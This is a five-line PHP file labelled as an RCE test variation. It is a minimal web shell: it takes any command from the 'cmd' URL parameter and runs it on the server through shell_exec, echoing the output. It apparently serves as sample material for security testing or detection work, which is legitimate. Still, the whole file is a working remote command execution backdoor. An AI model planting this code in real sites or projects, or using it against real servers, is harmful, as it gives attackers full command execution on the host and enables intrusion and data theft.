<?php
// RCE test variation #905
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>